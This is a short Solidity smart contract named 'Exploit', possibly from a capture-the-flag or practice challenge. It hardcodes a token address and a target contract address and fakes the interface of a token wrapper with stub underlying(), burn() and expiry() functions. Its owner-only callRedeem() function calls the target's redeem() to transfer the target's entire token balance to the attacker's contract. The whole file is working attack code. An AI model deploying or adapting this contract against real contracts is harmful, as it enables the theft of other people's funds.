
pragma solidity ^0.8.0;

interface oneinter{
    function balanceOf(address) external view returns(uint256);
}

interface twointer{
    function redeem(address,uint256) external;
}


contract Exploit{
    address private erc20 = 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
    address private beAttackedContra = 0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156;
    address private owner;

    constructor(){
        owner = msg.sender;
    }

    function underlying() public view returns (address) { 
        return 0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5;
    }

    function callRedeem() external { 
        require(msg.sender == owner,"not owner");
        uint256 value = oneinter(erc20).balanceOf(beAttackedContra);
        twointer(beAttackedContra).redeem(address(this),value);
        //require(oneinter(erc20).balanceOf(address(this)) == value,"exploit fail!");
    }

    function getBalance(address addr) public view returns(uint256){
        return oneinter(erc20).balanceOf(addr);
    }

    function burn() external { 
    }
    
    function expiry() public view returns(uint256) { 
        return 1337;
}

    fallback() external payable{}  
    receive() external payable{}
}
